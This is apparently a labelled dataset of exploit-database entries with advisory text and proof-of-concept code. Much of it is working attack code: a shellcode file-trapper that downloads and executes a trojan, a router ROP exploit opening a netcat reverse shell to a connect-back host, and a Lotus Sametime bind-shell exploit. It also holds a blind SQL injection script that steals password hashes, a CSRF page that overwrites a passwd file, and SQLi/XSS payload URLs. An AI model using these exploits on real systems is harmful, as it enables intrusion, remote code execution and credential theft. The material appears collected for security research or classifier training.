22289,"Microsoft Windows XP/ME - Help and Support Center Buffer Overflow // source: https://www.securityfocus.com/bid/6966/info  The Microsoft Windows ME Help and Support Center is prone to a buffer overflow. This is due to insufficient bounds checking on input supplied through the HCP URI parameter.  An attacker can exploit this vulnerability by making a HCP request with an overly long string. This will trigger the overflow condition and may result in malicious attacker-supplied code being executed on the vulnerable system.  A similar vulnerability was reported in the Windows XP Help and Support Center (BID 6802). These vulnerabilities may be related.  ** Conflicting details have been reported about this vulnerability. The discoverer claims that the issue is cross site scripting that allows script code emebedded into the HCP URL to be executed. The discoverer also claims that Windows XP without SP1 is also vulnerable to this issue, while Microsoft claims that it is not.  /*************************************************  * s0h - Skin Of Humanity.  * http://s0h.cc  *  * Title : Win32hlp exploit for : "":LINK overflow""  * Date : Sunday, 9 March, 2003 1:00 AM   *  * -----------------------------------------------  *    * Archive : http://s0h.cc/exploit/s0h_Win32hlp.c  * Binary : http://s0h.cc/exploit/s0h_Win32hlp.exe  *   * -----------------------------------------------  * Discovered by ThreaT <threat@s0h.cc>.  * Coded by ThreaT <threat@s0h.cc>  * Hompage : http://s0h.cc/~threat/  *   * Winhlp32.exe exploit for ':LINK' overflow !  *   * -----------------------------------------------  *  * This exploit can trap a .CNT file (file with .-  * HLP files) with the arbitrary code who can dow-  * nload and execute a trojan without user ask.  *  * -----------------------------------------------  *   * Compiling : cl /nologo s0h_Win32hlp.c  * Usage : s0h_Win32hlp.exe <trojan> <CNT file> [offset]  * Eq : C:\>s0h_Win32hlp.exe http://www.chez.com/mvm/trojan.exe c:\WINNT\Help\mplayer2.cnt 4  *   * <trojan> = host to download the trojan (http:/-  * /blah.plof/trojan.exe).  *   * <CNT file> = The CNT file.  *   * [offset] = Optionnal. This one defined a numbe-  * r between 0 and 15 that can play with the retu-  * rn address. Generaly, you must used 4 if the .-  * HLP file is called by an application.  *   * -----------------------------------------------  * This exploit was tested on :  * 	- Windows 2000 PRO/SERVER (fr) SP0  * 	- Windows 2000 PRO/SERVER (fr) SP1  *	- Windows 2000 PRO/SERVER (fr) SP2  *  ************************************************/   #include <windows.h>  #define taille	270 #define VulnLen	650  int main (int argc, char *argv[]) {  	HANDLE ExploitFile; 	DWORD lpNumberOfBytesWritten, lpFileSizeHigh, FileSize;  	int i,j, len, RetByte=0xE5;  	char *file, *url;  unsigned char *Shellcode, *buffer,  RealGenericShellcode[] =  ""\x68\x5E\x56\xC3\x90\x8B\xCC\xFF\xD1\x83\xC6\x0E\x90\x8B\xFE\xAC"" ""\x34\x99\xAA\x84\xC0\x75\xF8""  ""\x72\xeb\xf3\xa9\xc2\xfd\x12\x9a\x12\xd9\x95\x12\xd1\x95\x12\x58\x12\xc5\xbd\x91"" ""\x12\xe9\xa9\x9a\xed\xbd\x9d\xa1\x87\xec\xd5\x12\xd9\x81\x12\xc1\xa5\x9a\x41\x12"" ""\xc2\xe1\x9a\x41\x12\xea\x85\x9a\x69\xcf\x12\xea\xbd\x9a\x69\xcf\x12\xca\xb9\x9a"" ""\x49\x12\xc2\x81\xd2\x12\xad\x03\x9a\x69\x9a\xed\xbd\x8d\x12\xaf\xa2\xed\xbd\x81"" ""\xed\x93\xd2\xba\x42\xec\x73\xc1\xc1\xaa\x59\x5a\xc6\xaa\x50\xff\x12\x95\xc6\xc6"" ""\x12\xa5\x16\x14\x9d\x9e\x5a\x12\x81\x12\x5a\xa2\x58\xec\x04\x5a\x72\xe5\xaa\x42"" ""\xf1\xe0\xdc\xe1\xd8\xf3\x93\xf3\xd2\xca\x71\xe2\x66\x66\x66\xaa\x50\xc8\xf1\xec"" ""\xeb\xf5\xf4\xff\x5e\xdd\xbd\x9d\xf6\xf7\x12\x75\xc8\xc8\xcc\x66\x49\xf1\xf0\xf5"" ""\xfc\xd8\xf3\x97\xf3\xeb\xf3\x9b\x71\xcc\x66\x66\x66\xaa\x42\xca\xf1\xf8\xb7\xfc"" ""\xe1\x5f\xdd\xbd\x9d\xfc\x12\x55\xca\xca\xc8\x66\xec\x81\xca\x66\x49\xaa\x42\xf1"" ""\xf0\xf7\xdc\xe1\xf3\x98\xf3\xd2\xca\x71\xb5\x66\x66\x66\x14\xd5\xbd\x89\xf3\x98"" ""\xc8\x66\x49\xaa\x42\xf1\xe1\xf0\xed\xc9\xf3\x98\xf3\xd2\xca\x71\x8b\x66\x66\x66"" ""\x66\x49\x71\xe6\x66\x66\x66"";   printf ("" * ***************************************************** *\n"" 	"" *                 s0h - Skin of humanity                *\n"" 	"" *                    http://s0h.cc/                     *\n"" 	"" * ***************************************************** *\n"" 	""     Win32hlp exploit for : \"":LINK overflow\""           *\n"" 	"" * ***************************************************** *\n"" 	"" * Discovered by ThreaT <threat@s0h.cc>.                 *\n"" 	"" * Coded by ThreaT <threat@s0h.cc>                       *\n"" 	"" * Hompage : http://s0h.cc/~threat/                      *\n""  	"" * Archive : http://s0h.cc/exploit/s0h_Win32hlp.c        *\n"" 	"" * ***************************************************** *\n"" 	);  if (argc < 3) { 	printf( 		"" * ***************************************************** *\n"" 		"" * Usage : s0h_Win32hlp.exe <trojan> <CNT file> [offset] *\n"" 		"" *                                                       *\n"" 		"" * <trojan> = host to download the trojan (http:/-       *\n"" 		"" * /blah.plof/trojan.exe).                               *\n"" 		"" *                                                       *\n"" 		"" * <CNT file> = The CNT file.                            *\n"" 		"" *                                                       *\n"" 		"" * [offset] = Optionnal. This one defined a number betw- *\n"" 		"" * een 0 and 15 that can play with the return address. - *\n"" 		"" * Generaly, you must used 4 if the .HLP file is called  *\n"" 		"" * by an application.                                    *\n"" 		"" * ***************************************************** *\n""	 	);  	ExitProcess (1); }  if (argv[3]) RetByte = atoi (argv[3]) + 0xE0;  len = taille + strlen (argv[1]) + 2 + 4; url = (char *) malloc (strlen (argv[1])); strcpy (url, argv[1]);  /* * Create the final shellcode */  Shellcode = (unsigned char *) malloc (len);  // encrypt the URL for (i=0;i<strlen (argv[1]); argv[1][i++]^=0x99);  // inject the RealGenericShellcode in the shellcode buffer for (i=0;i<taille; Shellcode[i]=RealGenericShellcode[i++]);  // append crypted URL to the shellcode buffer for (i,j=0;i<len - 1;Shellcode[i++]=argv[1][j++]);   Shellcode[len-6]=0x99; // URL delimitation Shellcode[len-5]=0x2E; // fuck the winhlp32.exe parser  // append the RET ADDR // Play with this bytes if the xploit don't work Shellcode[len-4]=0x30; Shellcode[len-3]=RetByte; Shellcode[len-2]=0x06; Shellcode[len-1]=0x00;   /*  Now, we make a vuln string for our exploit */  buffer = (unsigned char *) malloc (VulnLen); memset (buffer,0,VulnLen);  lstrcpy (buffer,"":Link ""); for (i=6; i < VulnLen - len; buffer[i++] = (char)0x90); for (i,j=0; i < VulnLen; buffer[i++] = Shellcode[j++]);   /* Trap the CNT file specified with the vuln string */  ExploitFile = CreateFile (argv[2],GENERIC_READ+GENERIC_WRITE, 			  FILE_SHARE_READ+FILE_SHARE_WRITE,NULL, 			  OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);  if ( ExploitFile == INVALID_HANDLE_VALUE) { 	printf (""Error : cannot open cnt file '%s'\n"",argv[2]); 	ExitProcess (1); }  	FileSize = GetFileSize(ExploitFile, &lpFileSizeHigh); 	FileSize += lpFileSizeHigh*MAXDWORD;  	file = (char *)LocalAlloc (LPTR, FileSize + 2); 	file[0] = 0x0d; 	file[1] = 0x0a; 	file += 2;   	ReadFile(ExploitFile,file,FileSize,&lpNumberOfBytesWritten,NULL); 	 	SetFilePointer (ExploitFile,0,NULL,FILE_BEGIN); 	WriteFile (ExploitFile,buffer,VulnLen,&lpNumberOfBytesWritten,NULL); 	 	file -= 2; 	WriteFile (ExploitFile,file,FileSize+2,&lpNumberOfBytesWritten,NULL); 	 	CloseHandle(ExploitFile); 	         printf ( 		"" * *******************************************************\n"" 		"" * The file is now traped and ready to download and exe- *\n"" 		"" * cute :                                                *\n"" 		"" * File : %s\n"" 		"" * At : %s\n"" 		"" * *******************************************************\n"" 		,argv[2],url); 		 		if (RetByte != 0xE5) 			printf ( 				"" * *******************************************************\n"" 				"" * You have specified this address : 0x0006%x30          *\n"" 				"" * The abitrary will loaded since an application.        *\n"" 				"" * *******************************************************\n"" 				,RetByte); 			  	return 0; }",malicious attacker-supplied code being executed on the vulnerable system,1
38758,"SuperScan 4.1 - Scan Hostname/IP Field Buffer Overflow #!/usr/bin/env python # -*- coding: utf-8 -*- # Exploit Title     : SuperScan 4.1 Scan Hostname/IP Field Buffer Overflow Crash PoC # Discovery by      : Luis Martínez # Email		    : l4m5@hotmail.com # Discovery Date    : 18/11/2015 # Vendor Homepage   : http://www.foundstone.com # Software Link     : http://www.mcafee.com/us/downloads/free-tools/superscan.aspx # Tested Version    : 4.1 # Vulnerability Type    : Denial of Service (DoS) Local # Tested on OS      : Windows XP Professional SP3 x86 es # Steps to Produce the Crash:  # 1.- Run python code : python super_scan_4.1.py # 2.- Open super_scan_4.1.txt and copy content to clipboard # 3.- Open SuperScan4.1.exe # 4.- Paste Clipboard Scan > Hostname/IP # 5.- Clic on add button (->) # 6.- Crashed  buffer = ""\x41"" * 636 eip = ""\x42"" * 4  f = open (""super_scan_4.1.txt"", ""w"") f.write(buffer + eip) f.close()",Denial of Service,1
4678,"Seditio CMS 121 - SQL Injection <?php ## Seditio CMS <= 121 Remote SQL Injection Exploit ## Software site: http://www.neocrome.net/ ## By InATeam (http://inattack.ru/) ## Requirements: MySQL >= 4.1, magic_quotes_gpc=Off  echo ""------------------------------------------------------------\n""; echo ""Seditio CMS <= 121 Remote SQL Injection Exploit\n""; echo ""(c)oded by Raz0r, InATeam (http://inattack.ru/)\n""; echo ""dork: \""Powered by Seditio\""\n""; echo ""------------------------------------------------------------\n"";  if ($argc<2) { echo ""USAGE:\n""; echo ""~~~~~~\n""; echo ""php {$argv[0]} [url] OPTIONS\n\n""; echo ""[url]        - target server where Seditio CMS is installed\n\n""; echo ""OPTIONS:\n""; echo ""-p=<prefix>  - use specific prefix (default sed_)\n""; echo ""-id=<id>     - use specific user id (default 1)\n\n""; echo ""examples:\n""; echo ""php {$argv[0]} http://site.com/ -p=cms_\n""; echo ""php {$argv[0]} http://cms.site.com:8080/ -id=2\n""; die; }  error_reporting(0); set_time_limit(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",10); $url = $argv[1]; for($i=2;$i<$argc;$i++) {    if(strpos($argv[$i],""="")!==false) {        $exploded=explode(""="",$argv[$i]);        if ($exploded[0]=='-p') $prefix = $exploded[1];        if ($exploded[0]=='-id') $id = $exploded[1];    } } if (!isset($prefix)) $prefix = ""sed_""; if (!isset($id)) $id = 1; $url_parts = parse_url($url); $host = $url_parts['host']; if (isset($url_parts['port'])) $port = $url_parts['port']; else $port = 80; $path = $url_parts['path']; print(""[~] Connecting... ""); if (!getchar(""<1"",$i,false)) print(""OK\n""); else die(""\n[-] Exploit failed\n""); print(""    Getting hash...""); $hash=''; for ($i=1; $i<=32; $i++) {    if (!getchar("">57"",$i)) {        $min = 48;        $max = 57;           }    else {        $min = 97;        $max = 102;           }    for($j=$min;$j<=$max;$j++) {        if (getchar(""+LIKE+$j"",$i)) {            $hash .= chr($j);            break;        }    } } print(""[+] Done! hash - $hash\n""); print(""[+] Cookie to log in: \nSEDITIO="".base64_encode($id."":_:"".$hash."":_:ice"").""\n"");  function getchar($query,$pos,$status=true){    global $host,$path,$prefix,$id;    if ($status) status();    $data = ""sq=InATeam&frm_sub%5B%5D=9999&sea_frmtitle=1&sea_frmtext=1&sea_pagtitle=1"";    $data.= ""&sea_pagdesc=1&sea_pagtext=1&searchin_pag=1&pag_sub%5B%5D=qwerty')"";    $data.= ""+AND+1=IF(ORD(MID((SELECT+user_password+FROM+{$prefix}users+WHERE"";    $data.= ""+user_id={$id}),{$pos},1)){$query},1,(SELECT+1+UNION+SELECT+5))/*&x=GUEST"";       $packet  = ""POST {$path}plug.php?e=search&a=search HTTP/1.1\r\n"";    $packet .= ""Host: {$host}\r\n"";    $packet .= ""Referer: http://{$host}{$path}plug.php?e=search&a=search\r\n"";    $packet .= ""User-Agent: InAttack User Agent\r\n"";    $packet .= ""Content-Type: application/x-www-form-urlencoded\r\n"";    $packet .= ""Content-Length: "".strlen($data).""\r\n"";    $packet .= ""Connection: Close\r\n\r\n"";    $packet .= $data;    return (strpos(send($packet),'Subquery returns more than 1 row')===false) ? true : false; }  function send($packet) {    global $host,$port;    $ock = fsockopen(gethostbyname($host),$port);    if ($ock) {        fputs($ock, $packet);        $html='';        while (!feof($ock)) $html.=fgets($ock);    }    else die(""[-] Exploit failed\n"");    return $html; }  function status() {    static $n;    $n++;    if ($n > 3) $n = 0;    if($n==0){ print ""\r[-]\r""; }    if($n==1){ print ""\r[\\]\r"";}    if($n==2){ print ""\r[|]\r""; }    if($n==3){ print ""\r[/]\r""; } } ?>  # milw0rm.com [2007-11-29]",information disclosure,1
31603,"Parallels Virtuozzo Containers 3.0.0-25.4/4.0.0-365.6 VZPP Interface File Manger - Cross-Site Request Forgery source: https://www.securityfocus.com/bid/28589/info  Parallels Virtuozzo Containers is prone to a cross-site request-forgery vulnerability.  Exploiting the issue will allow a remote attacker to use a victim's currently active session to perform certain file-management actions with the privileges of the user running the application. Successful exploits will compromise affected computers.  Virtuozzo Containers 3.0.0-25.4.swsoft and 4.0.0-365.6.swsoft are vulnerable; other versions are also affected.  <!-- poplix papuasia.org -- http://px.dynalias.org -- 04-02-2008 this file exploits a vulnerable installation of virtuozzo web panel by overwriting /etc/passwd.demo tested against Version 365.6.swsoft (build: 4.0.0-365.6.swsoft). It doesn't work with older version due to paths changes. perform the following steps to test it: 1. create a blank /etc/passwd.demo on target machine 2. in this file replace 127.0.0.1 with target vps address 3. open a web browser and log into virtuozzo web interface 4. open this file in a new browser window and click the ""lets rock"" button when the page is fully loaded 5. check /etc/passwd.demo in the target vps filesystemm --> <script language=""JavaScript""> var ok=false; function letsgo(){ ok=true; document.getElementById('form0').submit(); } </script> <!-- this sets /etc as the current path--> <iframe style=""width:1px;height:1px;visibility:hidden"" name=ifr src=""https://127.0.0.1:4643/vz/cp/vzdir/infrman/envs/files/index?path=L2V0Yw=="" ></iframe> <iframe id=ifr1 style=""width:1px;height:1px;visibility:hidden"" name=ifr1 onload=""if(ok)document.getElementById('form1').submit();"" ></iframe> <iframe id=ifr2 style=""width:1px;height:1px;visibility:hidden"" name=ifr2 > </iframe> <!-- delete /etc/passwd.demo --> <form id=form0 target=ifr1 method=post action=""https://127.0.0.1:4643/vz/cp/vzdir/infrman/envs/files/list-control"" > <input type=hidden name=""file-name"" value=""passwd.demo""> <input type=hidden name=delete value=1> </form> <!-- create /etc/passwd.demo --> <form id=form1 target=ifr2 enctype=""multipart/form-data"" name=""defaultForm"" method=""POST"" action=""https://127.0.0.1:4643/vz/cp/vzdir/infrman/envs/files/create-file""> <input xmlns:http=""http://www.swsoft.com/xsl/cp/http"" type=""hidden"" name=""step"" value=""gen""> <input type=hidden name=""file_name"" value=""passwd.demo""> <input type=hidden name=""file_body"" value=""root::0:0::/root:/bin/bash""> <input type=hidden name=""next"" value=""Create""> </form> <input type=button value=""lets rock"" onclick=""letsgo()"">",perform certain file-management actions with the privileges of the user running the application,1
44074,"Dasan Networks GPON ONT WiFi Router H640X 12.02-01121 / 2.77p1-1124 / 3.03p2-1146 - Remote Code Execution ## Vulnerability Summary The following advisory describes a buffer overflow that leads to remote code execution found in Dasan Networks GPON ONT WiFi Router H640X versions 12.02-01121 / 2.77p1-1124 / 3.03p2-1146  Dasan Networks GPON ONT WiFi Router “is indoor type ONT dedicated for FTTH (Fibre to the Home) or FTTP (Fiber to the Premises) deployments. That can work as simple Bridge or behave as Router/NAT. It’s cost-effective CPE that meets carrier-class requirement for Telcom industry and guarantee reliable service proven in the field.”  ## Credit An independent security researcher, TigerPuma (at) Fosec.vn, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program  ## Vendor response We tried to contact Dasan since October 8 2017, repeated attempts to establish contact went unanswered. At this time there is no solution or workaround for this vulnerability.  ## Vulnerability details All cgi in Dasan web service are symbolic link of cgipage.cgi, and when client request, lighttpd will invoke the corresponding path.  The buffer overflow vulnerability found in function login_action which handler login request.  The function uses strcpy without check length of input from client request.  If we will look at the stack, we can see that we can trigger the buffer overflow and in the end to control the pc.  ## Proof of Concept  ``` import sys import socket import json import time import struct import ssl  if len(sys.argv) != 4:     print ""Use: {} ip port connectback"".format(sys.argv[0])     sys.exit(1)  host = str(sys.argv[1]) port = int(sys.argv[2])  connectback = str(sys.argv[3])  buf = 1024 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #sock.settimeout(10)  clientsocket = ssl.wrap_socket(sock) #clientsocket = sock clientsocket.connect((host, port))  addr_libc = 0x2ad0c000 # 0x2ad0e000 with H640DW  # rop1 rop1 = addr_libc + 0x00115d40       #addiu $a0,$sp,0x18 |  jalr  $s0 addr_rop1 = struct.pack("">i"",rop1) #rop2 system = addr_libc + 0x0003CC9C     #system addr_system =  struct.pack("">i"",system)  # execute command command = ""nc "" + connectback + "" -e /bin/sh;""  payload = ""A""*(756 - 0x28) + addr_system + 'C'*(0x28-8) + addr_rop1 + ';'*24 + command  data = ""action={}&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\r\n"".format(payload)  http_payload = """"""POST /cgi-bin/login_action.cgi HTTP/1.1\r\nHost: 192.168.1.100:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://192.168.1.100:8080/cgi-bin/login.cgi\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n{}"""""".format(len(data),data)  print http_payload  clientsocket.send(http_payload)  respond_raw = clientsocket.recv(buf).strip()  print respond_raw  respond_raw = clientsocket.recv(buf).strip()  print respond_raw respond_raw = clientsocket.recv(buf).strip()  print respond_raw  clientsocket.close() ```",remote code execution,1
25279,"ESMI PayPal StoreFront 1.7 - 'products1.php?id2' SQL Injection source: https://www.securityfocus.com/bid/12903/info   ESMI PayPal Storefront is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in as SQL query.   Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/hv/ecdis/products1.php?id=6&id2='SQLINJECTION&subcat=Asus&p=products1",exploit vulnerabilities in the underlying database implementation,1
27029,"EZ Invoice Inc. EZI 2.0 - 'Invoices.php' SQL Injection source: https://www.securityfocus.com/bid/16133/info  EZI is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/ezi/invoices.php?i=[SQL]",exploit vulnerabilities in the underlying database implementation,1
33579,"Ingres Database 9.3 - Heap Buffer Overflow source: https://www.securityfocus.com/bid/38001/info  Ingres Database is prone to a heap-based buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data.  Attackers can exploit this issue to execute arbitrary code with the privileges of the application or crash the affected application.  Ingres Database 9.3 on Unix is vulnerable; other versions may also be affected.  s = ""\x00\x00\x00\x00"" s += ""\xff\xff\xff\xff"" s += ""\x3c\x00\x00\x00\x06\x00\x00\x00"" s += ""A"" * 1000",the application fails to perform adequate boundary checks on user-supplied data,1
31820,"IBM Lotus Sametime 8.0 - Multiplexer Buffer Overflow source: https://www.securityfocus.com/bid/29328/info  IBM Lotus Sametime is prone to a remote buffer-overflow vulnerability because it fails to properly bounds-check user-supplied data before copying it to an insufficiently sized memory buffer.  An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will likely result in a denial of service.   #!perl # # ""IBM Lotus Sametime"" StMUX Stack Overflow Exploit # # Author:  Manuel Santamarina Suarez # e-Mail:  FistFuXXer@gmx.de #  use IO::Socket; use File::Basename;  # # destination TCP port # $port = 1533;  # # SE handler # # Don't use upper-case ASCII characters or 0x00, 0x0a, 0x0b, 0x0d, 0x20 # You MUST use a POP/POP/RET sequence that doesn't modify the ESP register # $seh = reverse( ""\x7C\x34\x10\xC2"" );  # POP ECX/POP ECX/RET                                        # msvcr71.7c3410c2                                        # universal  # # Shellcode # # Win32 Bind Shellcode (EXITFUNC=process, LPORT=4444) # $sc = ""\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"".       ""\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"".       ""\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"".       ""\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"".       ""\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"".       ""\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"".       ""\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"".       ""\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"".       ""\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"".       ""\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0"".       ""\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"".       ""\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"".       ""\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"".       ""\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"".       ""\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"".       ""\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"".       ""\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"".       ""\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"".       ""\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"".       ""\x52\xff\xd0\x68\x7e\xd8\xe2\x73\x53\xff\xd6\xff\xd0"";  # # JUMP to 'ESP adjustment' and shellcode # $jmp = ""\x74\x23"".  # JE SHORT        ""\x75\x21"";  # JNZ SHORT   # # # Don't edit anything after this line # #   sub usage {     print ""Usage: "" . basename( $0 ) . "" [target] [IPv4 address]\n"".           ""Example: "". basename( $0 ) . "" 1 192.168.1.32\n"".           ""\n"".           ""Targets:\n"".           ""[1]  Lotus Sametime 7.5 on Windows Server 2000 SP4\n"".           ""[2]  Lotus Sametime 7.5 on Windows Server 2003 SP2\n"";     exit; }   # Net::IP::ip_is_ipv4 sub ip_is_ipv4 {     my $ip = shift;          if (length($ip) < 7) {         return 0;     }      unless ($ip =~ m/^[\d\.]+$/) {         return 0;     }      if ($ip =~ m/^\./) {         return 0;     }      if ($ip =~ m/\.$/) {         return 0;     }      if ($ip =~ m/^(\d+)$/ and $1 < 256) {         return 1     }      my $n = ($ip =~ tr/\./\./);      unless ($n >= 0 and $n < 4) {         return 0;     }      if ($ip =~ m/\.\./) {         return 0;     }      foreach (split /\./, $ip) {         unless ($_ >= 0 and $_ < 256) {             return 0;         }     }          return 1; }   print ""---------------------------------------------------\n"".       ' ""IBM Lotus Sametime"" StMUX Stack Overflow Exploit'.""\n"".       ""---------------------------------------------------\n\n"";  if( ($#ARGV+1) != 2 ) {     &usage; }  # Windows 2000 SP4 if( $ARGV[0] == 1 ) {     $popad = ""\x5b"" x 3 .     # POP EBX              ""\x61"" x 268 .   # POPAD              ""\xff\x24\x24"";  # JMP DWORD PTR SS:[ESP] } # Windows 2003 SP2 elsif( $ARGV[0] == 2 ) {     $popad = ""\x5b"" x 3 .     # POP EBX              ""\x61"" x 269 .   # POPAD              ""\xff\x24\x24"";  # JMP DWORD PTR SS:[ESP] } else {     &usage; }      if( ip_is_ipv4( $ARGV[1] ) ) {     $ip = $ARGV[1]; } else {     &usage; }  print ""[+] Connecting to $ip:$port...\n"";  $sock = IO::Socket::INET->new (     PeerAddr => $ip,     PeerPort => $port,     Proto    => 'tcp',     Timeout  => 2 ) or print ""[-] Error: Couldn't establish a connection to $ip:$port!\n"" and exit;  print ""[+] Connected.\n"".       ""[+] Trying to overwrite and control the SE handler...\n"";  $path = ""\x66"" x 44 . $jmp . $seh . ""\x66"" x 29 . $popad; $sock->send (     ""POST /CommunityCBR/CC.39.$path/\r\n"".     ""User-Agent: Sametime Community Agent\r\n"".     ""Host: $ip:1533\r\n"".     ""Content-Length: "". length( $sc ) .""\r\n"".     ""Connection: Close\r\n"".     ""Cache-Control: no-cache\r\n"".     ""\r\n"".     $sc );  sleep( 3 ); close( $sock );  print ""[+] Done. Now check for a bind shell on $ip:4444!\n"";",execute arbitrary code within the context of the affected application,1
29241,MaviPortal - 'Arama.asp' Cross-Site Scripting source: https://www.securityfocus.com/bid/21512/info  MaviPortal is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/[scriptoath]/arama.asp?a_r_a_n_a_c_a_k= [xss Code],have arbitrary script code execute in the browser of an unsuspecting user,1
43842,"X-Cart < 4.1.3 - Arbitrary Variable Overwrite X-Cart Arbitrary Variable Overwrite  Vendor: Qualiteam Product: X-Cart Version: <= 4.1.3 Website: http://www.x-cart.com/  BID: 20108  CVE: CVE-2006-4904  OSVDB: 28957  SECUNIA: 22005   Description: X-Cart is a commercial web based eCommerce solution written in PHP and MySQL that allows for webmasters to host an online marketplace. Unfortunately an attacker may be able to execute arbitrary php code on an X-Cart installation by overwriting key configuration variables. However, because the vulnerability allows for any variables to be overwritten other attacks such as SQL Injection are probably possible as well. Qualiteam have released an updated version of their X-Cart software, and users are strongly encouraged to upgrade as soon as possible or delete the cmpi.php script that resides within the payments directory.    Arbitrary Variable Overwriting X-Cart comes with a number of payment processing scripts. Unfortunately the Cardinal payment processing script (cmpi.php) is vulnerable to arbitrary variable overwriting that allows for an attacker to conduct various attacks including arbitrary php code execution. Let's have a look at the vulnerable code in question.  if ($HTTP_POST_VARS) { 	foreach ($HTTP_POST_VARS as $var => $value) { 		$$var = $value; 	} }  As we can see every single post variable is dynamically evaluated. This is especially dangerous because register globals and magic quotes gpc settings do not affect an attackers ability to overwrite key configuration variables.   stand_alone=0&httpsmod_active=1&orderids=1&close_frame=1&xcart_dir=http://shell   By sending a post request with the above variables set will automatically include an execute a remote arbitrary file on the vulnerable X-Cart installation, which in turn leads to remote php code execution on the underlying web server in most cases.    Solution: The X-Cart team were very quick and professional in their response to this issue.An updated version of X-Cart has been released and users are encouraged to upgrade as soon as possible.    Credits: James Bercegay of the GulfTech Security Research Team",execute arbitrary php code on an X-Cart installation,1
37881,"Adobe Flash - Shared Object Type Confusion Source: https://code.google.com/p/google-security-research/issues/detail?id=434&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id  The Shared Object constructor does not check that the object it is provided is of type Object before setting it to be of type SharedObject. This can cause problems if another method (such as Sound.loadSound) calls into script between checking the input object type, and casting its native object. A PoC is as follows:  class subso extends Sound{  	public function subso(f){ 			 	super(""_level0.test""); 	var n = {valueOf : func}; 	_global.func = f; 	_global.t = this; 	var f2 = this.loadSound; 	f2.call(this, n, 1); }  function func(){ 	 	_global.func(_global.t,""/sosuper.swf"", ""/sosuper.swf""); 	return 1; 	} } 	  A sample fla, swf and AS file are attached. Note that this PoC needs to be hosted on a webserver to work and only works on 32-bit systems (tested on Windows Chrome). song1.mp3 should be put in the same folder on the server as the swf, it is needed for loadSound to work. This bug is likely only exploitable on 32-bit systems due to how the type-confused fields line up.  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/37881.zip",denial of service,1
35418,WordPress Plugin Inline Gallery 0.3.9 - 'do' Cross-Site Scripting source: https://www.securityfocus.com/bid/46781/info  The Inline Gallery WordPress Plugin is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Inline Gallery WordPress Plugin 0.3.9 is vulnerable; other versions may also be affected.   http://www.example.com/wp-content/plugins/inline-gallery/browser/browser.php?do=%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E,execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
